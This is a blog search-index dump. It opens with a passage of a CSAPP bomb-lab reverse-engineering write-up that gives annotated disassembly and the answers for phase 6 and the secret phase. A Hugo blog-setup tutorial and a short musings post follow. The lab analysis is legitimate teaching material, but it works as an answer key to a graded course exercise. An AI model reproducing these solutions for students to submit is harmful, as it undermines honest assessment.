\u0026#39;l\u0026#39; (gdb) x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; 0x4024b9 f 0x4024bf l 0x4024be y 0x4024b5 e 0x4024b6 r 0x4024b7 s array数组的表格如下\narray[i]的i 对应的char input[rax] 0 m 0x*0 1 a 0x*1 2 d 0x*2 3 u 0x*3 4 i 0x*4 5 e 0x*5 6 r 0x*6 7 s 0x*7 8 n 0x*8 9 f 0x*9 a o 0x*a b t 0x*b c v 0x*c d b 0x*d e y 0x*e f l 0x*f 所以输入的字符串只需找到表格中对应flyers字符串的input[rax]任意组合即可，比如ionefg(0x69 0x6f 0x6e 0x65 0x66 0x67)\nPhase_6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp //入栈，栈指针减少80 401100:\t49 89 e5 mov %rsp,%r13 //r13=rsp 401103:\t48 89 e6 mov %rsp,%rsi //rsi=rsp 401106:\te8 51 03 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; //读取6个数字 40110b:\t49 89 e6 mov %rsp,%r14 //r14=rsp 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d //r12d=0 401114:\t4c 89 ed mov %r13,%rbp //rbp=r13 rsp rsp+4 401117:\t41 8b 45 00 mov 0x0(%r13),%eax //eax=*(r13) 40111b:\t83 e8 01 sub $0x1,%eax //eax=eax-1 40111e:\t83 f8 05 cmp $0x5,%eax //eax与5比较 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; //若eax\u0026lt;=5，跳转到0x401128 401123:\te8 12 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401128:\t41 83 c4 01 add $0x1,%r12d //r12d=r12d+1=1 2 40112c:\t41 83 fc 06 cmp $0x6,%r12d //r12d与6比较 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; //若r12d=6，则跳转到0x401153 401132:\t44 89 e3 mov %r12d,%ebx //ebx=r12d=1 2 401135:\t48 63 c3 movslq %ebx,%rax //rax=ebx 1 2 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax //eax=*(rsp+rax*4) 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; //若*(rbp)!=*(rsp+rax*4),跳转到0x401145 401140:\te8 f5 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401145:\t83 c3 01 add $0x1,%ebx //ebx++ 2 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; //若ebx\u0026lt;=5,跳转到0x401135 40114d:\t49 83 c5 04 add $0x4,%r13 //r13+=4 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; //跳转到0x401114 #这段代码的目的就是让所有参数要小于等于6，并且不得重复 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi //rsi=rsp+24 401158:\t4c 89 f0 mov %r14,%rax //rax=r14 rsp 40115b:\tb9 07 00 00 00 mov $0x7,%ecx //ecx=7 401160:\t89 ca mov %ecx,%edx //edx=ecx=7 401162:\t2b 10 sub (%rax),%edx //edx=edx-*(rax) 7-*(rsp) 401164:\t89 10 mov %edx,(%rax) //*(rax)=edx *(rsp)=7-*(rsp) 401166:\t48 83 c0 04 add $0x4,%rax //rax=rax+4 rsp+4 40116a:\t48 39 f0 cmp %rsi,%rax //rax与rsi比较 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; //若rax!=rsi，则跳转到0x401160 六次循环 #这段代码就是处理参数 #相当于for(int i=0;i\u0026lt;6;i++){ #input[i]=7-input[i]; #} 40116f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; //跳转到0x401197 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx //rdx=*(rdx+8) *(0x6032d0+8) 40117a:\t83 c0 01 add $0x1,%eax //eax++ 2 40117d:\t39 c8 cmp %ecx,%eax //比较ecx和eax的大小 *(rsp)与2大小 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; //若ecx!=eax，则跳转到0x401176 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; //跳转到0x401188 401183:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) //*(rsp+rsi*2+32)=rdx 40118d:\t48 83 c6 04 add $0x4,%rsi //rsi=rsi+4 4 401191:\t48 83 fe 18 cmp $0x18,%rsi //rsi与24比较 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; //若rsi=24，跳转到0x4011ab 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx //ecx=*(rsp+rsi) 指针偏移，依次获取6个数 *(rsp) *(rsp+4) 40119a:\t83 f9 01 cmp $0x1,%ecx //比较ecx与1的大小 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; //若ecx\u0026lt;=1，跳转到0x401183 即当处理后的*(rsp)=1时 40119f:\tb8 01 00 00 00 mov $0x1,%eax //eax=1 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; //跳转到0x401176 #这段代码不太好着手，根据我们输入的1 2 3 4 5 6带入运行，经过之前的处理后编程了6 5 4 3 2 1， #这段代码的关键在于0x6032d0这个地址代表的含义， #在处理第一个参数6时，发现在不断嵌套使用地址，优点像链表，利用gdb查看，这个地址的值发现： #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032f0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x00603300 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x00603310 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603320 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 #在这里，我的输入是1 2 3 4 5 6 #我们看到打印出来的结果，每个node里第2个四字节的部分和我们的输入吻合； #而第三个四字节的部分则是下一个node的起始地址，最后一个四字节的部分则为0， #考虑到内存对齐，我们大概能推测出，这应该是一个链表，而我们的输入的数字与在第二个四字节的地方的数据有关， #第一个四字节的内容表示的是什么待确定 # 这个结构体有点类似链表： # struct { # int sth; // 某四字节内容 # int input; // 与我们的输入有关 # node* next; // 下一个node地址 # } node; #这么看下来这段代码就是将处理后参数所对应node的起始地址存储到首地址为rsp+0x20，尾地址为rsp+0x50的地方 #(gdb) x/12w $rsp+0x20 #0x7fffffffd8c0: 0x00603320 0x00000000 0x00603310 0x00000000 #0x7fffffffd8d0: 0x00603300 0x00000000 0x006032f0 0x00000000 #0x7fffffffd8e0: 0x006032e0 0x00000000 0x006032d0 0x00000000 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx //rbx=*(rsp+0x20) 0x00603320 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax //rax=(rsp+0x28) 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi //rsi=(rsp+0x50) 4011ba:\t48 89 d9 mov %rbx,%rcx //rcx=rbx=*(rsp+0x20) 0x00603320 4011bd:\t48 8b 10 mov (%rax),%rdx //rdx=*(rax)=*(rsp+0x28) 0x00603310 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) //*(rcx+8)=rdx *(*(rsp+0x20)+8)=*(rsp+0x28) //*0x00603328=0x00603310 *0x00603318=0x603300 4011c4:\t48 83 c0 08 add $0x8,%rax //rax+=8 (rsp+0x30) 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt; //若rax=rsi,跳转到0x4011d2 4011cd:\t48 89 d1 mov %rdx,%rcx //rcx=rdx *(rsp+0x28) 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; //跳转到0x4011bd #这段代码可以简化为一个for循环，这个循环用来将链表的结点重新调整至第一个参数的结点为头节点， #后面的参数依次链接在这个头结点后的链表： #for(int i=0;i\u0026lt;6;i++){ #node[i]-\u0026gt;next=node[i+1]; #} #结果如下 #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032d0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x006032e0 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x006032f0 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603300 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00603310 0x00000000 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) ///*(rdx+8)=0 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp //ebp=5 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax //rax=*(rbx+8)=头结点的下一个结点rbx=*(rsp+0x20) 4011e3:\t8b 00 mov (%rax),%eax //eax=*(rax) 下一结点的sth内容 4011e5:\t39 03 cmp %eax,(%rbx) //当前结点的sth与下一结点的sth内容比较 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; //若*(rbx)\u0026gt;=eax，则跳转到0x4011ee 4011e9:\te8 4c 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx //rbx=*(rbx+8) 指向下一个结点 4011f2:\t83 ed 01 sub $0x1,%ebp //ebp-- 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; //若不等于0，则跳转到0x4011df 4011f7:\t48 83 c4 50 add $0x50,%rsp //出栈，栈指针增加80 #这段代码主要是比较每个结点和下一个结点的sth值(结点的首四字节内容)，当前结点的sth要大于等于下一结点的sth， #所以我们需要将sth的值排序从大到小排序,排序后所结点对应序号的序列就是我们要输入的参数值和对应顺序， #即4 3 2 1 6 5 注意参数被处理过，不要写成3 4 5 6 1 2 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 ret 注释中一般都只写了第一次循环各寄存器所对应的值，若有多个值则是循环了多次，一般循环两三次就能看出整个函数的用意。整个phase_6调试所输入的参数为1 2 3 4 5 6\nBonus 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi #地址的值是\u0026#34;%d %d %s\u0026#34; 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi #地址的值是\u0026#34;7 0\u0026#34;这正是第4关的key，推测从这关进入彩蛋 4015fa:\te8 f1 f5 ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #eax!=3，就跳转到末尾 401604:\tbe 22 26 40 00 mov $0x402622,%esi #esi=0x402622 该地址对应\u0026#34;DrEvil\u0026#34; 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi #rdi=*(rsp+16) 40160e:\te8 25 fd ff ff call 401338 \u0026lt;strings_not_equal\u0026gt; #判断字符串是否相等 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #如果不等，就跳转到末尾 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff call 401242 \u0026lt;secret_phase\u0026gt; #因此进入彩蛋需要在第4关的答案后面添上\u0026#34;DrEvil\u0026#34;字符串 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 ret 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; #若rdi=0，则跳转 40120d:\t8b 17 mov (%rdi),%edx #edx=*(rdi)=0x24 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; #若edx\u0026lt;=esi，则跳转 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi #rdi=*(rdi+8) 401217:\te8 e8 ff ff ff call 401204 \u0026lt;fun7\u0026gt; func7(0x00603110,input) 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax #eax=0 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; #若edx=esi，则跳转 input不能等于0x24 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi #rdi=*(rdi+16) 40122d:\te8 d2 ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax #eax=rax+rax+1 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; #跳转 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 ret #等价c语言： int fun7(int input, Node* addr){ if(addr == 0){ return -1; } int v = addr-\u0026gt;value; if (v == input){ return 0; }else if( v \u0026lt; input){ return 1 + 2*fun7(input, addr-\u0026gt;right); }else{ return 2*func7(input, addr-\u0026gt;left); } } #纵观eax值的设置，一共有三处，esi\u0026lt;edx时，eax=2*eax； esi=edx时，eax=0；esi\u0026gt;edx时，eax=rax+rax+1，在它们的前面还会嵌套调用func7 #若想让eax=2，那么只有让最深层的func7调用eax=0，然后调用eax=rax+rax+1，最后最外面这层func7函数调用eax=2*eax，这样刚好等于2 #所以input\u0026lt;0x24 input\u0026gt;0x8 input=0x16 #这里的设置与phase_6的设置有些类似，涉及到了地址嵌套调用，使用gdb查看相应的内存地址范围的值，一目了然。 #(gdb) x/120w 0x6030f0 #0x6030f0 \u0026lt;n1\u0026gt;: 0x00000024 0x00000000 0x00603110 0x00000000 #0x603100 \u0026lt;n1+16\u0026gt;: 0x00603130 0x00000000 0x00000000 0x00000000 #0x603110 \u0026lt;n21\u0026gt;: 0x00000008 0x00000000 0x00603190 0x00000000 #0x603120 \u0026lt;n21+16\u0026gt;: 0x00603150 0x00000000 0x00000000 0x00000000 #0x603130 \u0026lt;n22\u0026gt;: 0x00000032 0x00000000 0x00603170 0x00000000 #0x603140 \u0026lt;n22+16\u0026gt;: 0x006031b0 0x00000000 0x00000000 0x00000000 #0x603150 \u0026lt;n32\u0026gt;: 0x00000016 0x00000000 0x00603270 0x00000000 #0x603160 \u0026lt;n32+16\u0026gt;: 0x00603230 0x00000000 0x00000000 0x00000000 #0x603170 \u0026lt;n33\u0026gt;: 0x0000002d 0x00000000 0x006031d0 0x00000000 #0x603180 \u0026lt;n33+16\u0026gt;: 0x00603290 0x00000000 0x00000000 0x00000000 #0x603190 \u0026lt;n31\u0026gt;: 0x00000006 0x00000000 0x006031f0 0x00000000 #0x6031a0 \u0026lt;n31+16\u0026gt;: 0x00603250 0x00000000 0x00000000 0x00000000 #0x6031b0 \u0026lt;n34\u0026gt;: 0x0000006b 0x00000000 0x00603210 0x00000000 #0x6031c0 \u0026lt;n34+16\u0026gt;: 0x006032b0 0x00000000 0x00000000 0x00000000 #0x6031d0 \u0026lt;n45\u0026gt;: 0x00000028 0x00000000 0x00000000 0x00000000 #0x6031e0 \u0026lt;n45+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6031f0 \u0026lt;n41\u0026gt;: 0x00000001 0x00000000 0x00000000 0x00000000 #0x603200 \u0026lt;n41+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603210 \u0026lt;n47\u0026gt;: 0x00000063 0x00000000 0x00000000 0x00000000 #0x603220 \u0026lt;n47+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603230 \u0026lt;n44\u0026gt;: 0x00000023 0x00000000 0x00000000 0x00000000 #0x603240 \u0026lt;n44+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603250 \u0026lt;n42\u0026gt;: 0x00000007 0x00000000 0x00000000 0x00000000 #0x603260 \u0026lt;n42+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603270 \u0026lt;n43\u0026gt;: 0x00000014 0x00000000 0x00000000 0x00000000 #0x603280 \u0026lt;n43+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603290 \u0026lt;n46\u0026gt;: 0x0000002f 0x00000000 0x00000000 0x00000000 #0x6032a0 \u0026lt;n46+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6032b0 \u0026lt;n48\u0026gt;: 0x000003e9 0x00000000 0x00000000 0x00000000 #0x6032c0 \u0026lt;n48+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 call 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx #edx=10 第三个参数 40124d:\tbe 00 00 00 00 mov $0x0,%esi #esi=0 第二个参数 401252:\t48 89 c7 mov %rax,%rdi #rdi=rax 第一个参数 401255:\te8 76 f9 ff ff call 400bd0 \u0026lt;strtol@plt\u0026gt; #将字符串转为长整型 40125a:\t48 89 c3 mov %rax,%rbx #rbx=rax 40125d:\t8d 40 ff lea -0x1(%rax),%eax #eax=rax-1 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #eax与1000比较 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; #若eax\u0026lt;=1000,则跳转到0x40126c 401267:\te8 ce 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 40126c:\t89 de mov %ebx,%esi #esi=ebx 第二个参数为转化后的长整型数字 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi #edi=0x6930f0 第一个参数 401273:\te8 8c ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax #比较eax和2 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt; #若eax=2，跳转到0x401282,所以func7函数返回值必须要等于2 40127d:\te8 b8 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 401282:\tbf 38 24 40 00 mov $0x402438,%edi #edi=0x402438 401287:\te8 84 f8 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 call 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 注意：彩蛋要在输入6个关卡的答案后才会出现。\n","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu16866174452783611002.jpg","permalink":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/","title":"CSAPP:bomb实验"},{"content":"Hugo介绍 Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。\nHugo中文文档地址： https://www.gohugo.org\nHugo安装 下载地址：https://github.com/gohugoio/hugo/releases\n找到对应系统的下载文件(win10为例，建议选择extended版本，有些主题需要extended版本才能正常使用)\n建立blog文件夹，并将下载好的zip文件解压到该文件夹下(建议不要有中文和空格)\n再将hogu.exe的路径添加到环境变量中(不会则请STFW)\n在cmd中查看命令是否成功\n1 2 3 4 5 输入下面命令查看是否成功 $ hugo version 输出结果： Hugo Static Site Generator v0.68.3/extended windows/amd64 BuildDate: unknown 说明安装成功 设置站点\n1 hugo new site myBlog 生成myblog文件夹\nHugo主题下载 官方网址：https://www.gohugo.org/theme/\n我这里下载的是：CaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers (github.com)\n建议安装方法：\n将下载好的主题解压放入之前new出来的文件夹(我这里是myblog)文件夹下的themes下\n并在myblog/config.toml里加一行 theme=xxxx（解压后的主题文件夹的名称）\n把主题中的config.yaml或toml文件复制放到myblog文件夹下\n启动站点\n1 hugo server 请注意倒数第二行（ Web Server is available at //localhost:1313/ (bind address 127.0.0.1) ）说明启动成功了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Building sites … WARN 2020/04/07 17:51:51 Markup type mmark is deprecated and will be removed in a future release. See https://gohugo.io//content-management/formats/#list-of-content-formats | EN -------------------+----- Pages | 74 Paginator pages | 0 Non-page files | 21 Static files | 8 Processed images | 28 Aliases | 14 Sitemaps | 1 Cleaned | 0 Built in 1103 ms Watching for changes in F:\\blog\\myBlog\\{archetypes,content,data,layouts,static,themes} Watching for config changes in F:\\blog\\myBlog\\config.toml, F:\\blog\\myBlog\\config\\_default Environment: \u0026#34;development\u0026#34; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at //localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop 在浏览器中输入 localhost:1313，就可以看到效果了\n注意事项：如果启动站点失败，可以先将主题删除，再启动站点，看是否报错，若没报错则是主题配置问题。\n创建文章 创建第一篇文章，放到 post 目录，方便之后生成聚合页面。(注意命名时不可以空格，可以用-代替)\n1 hugo post/first.md 然后就可以使用 hugo server 来查看效果啦！\n(注意：如果没出现新文章，则可能开启了draft模式，使用hogu server -D)\n部署到服务器 我们将使用github.io来代替服务器以及域名：推荐参考教程\n几个注意事项：\nGit要上传或执行的文件可以在文件夹中，右键空白地区点git bash here从而实现目录内操作。 在linux操作中（比如git）粘贴操作是shift+insert或单击鼠标的滚轮。而复制只要选中即可。 github的域名地址与用户名必须一致，比如你的github名字叫sakura，那么域名必须是sakura.github.io。 hugo命令 hugo --baseUrl=\u0026quot;https://你的github名字.github.io/\u0026quot;执行完后，会生成一个public文件夹。 用git推送的时候 git pull --rebase origin master语句可能会出错显示没有文件，不用担心，这是因为此时目标仓库是空的，直接下一步最后，你只需要输入对应网址，即可看到博客了！ 如果想将默认语言设置为中文，只要在config中设置一下defaultContentLanguage=\u0026ldquo;zh-cn\u0026quot;就行了，但可能会不生效，最好将其放在config.toml的第一行 更新博客 在博客目录下使用 hugo \u0026ndash;baseURL=\u0026ldquo;https://你的github名字.github.io/\u0026ldquo;覆盖原来的public文件夹\n进入public文件夹右键git bash 分别执行\n1 2 3 git add . git commit -m ‘first commit’ git push origin master 可能存在的问题：\ngithub上存放文件的仓库是否只有一个分支（创建时不要勾选生成README.md) 正常public上传github仓库后会只有一个分支，且包含了public内的所有文件 文章看不到,检查是否格式正确，使用了hugo new xxxx.md,检查是否包含了 draft: true，若有则删除或使用 hugo server -D，若草稿模式开启是看不到文章的 git push不成功,此时大概率是网络通信有问题，可以关掉git终端后科学上网；重启git 终端后（windows需要，linux系统不需要）再进行push大概率就可以解决问题了；此时无需再进行git init 等初始化操作因为之前已经做完。 添加评论功能 可参考这篇博客：使用vercel搭建属于自己的waline评论系统 | 叉七的叨叨哔 (xseven.top)\n如果评论无法正常显示，则可能是引文vercel.app被DNS污染导致无法使用，需要自行配置域名，具体解决方案可查看这篇博客。\nWaline国内IP无法评论的解决方案(LeanCloud国际版/Vercel) | 泉子的理想乡 (izumi.vip)\n参考资料 从零到一，用 Hugo 打造你的个人网站 (brume.top)\n如何用 GitHub Pages + Hugo 搭建个人博客 · KrislinBlog (krislinzhao.github.io)\n","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu13415945946882854451.jpg","permalink":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","title":"个人博客搭建"},{"content":"随想录 一些很好的话 世界上没有直路，要准备走曲折的路。 只要我不放弃的话缘分就会一直下去。 躺平有时，奋斗又是，发疯有时，理性有时，但最终我们依然向往的是一种正向的东西，而不是一种虚伪的东西。 ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/1_hu17545487328256898304.jpg","permalink":"https://chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/","title":"随想录"}]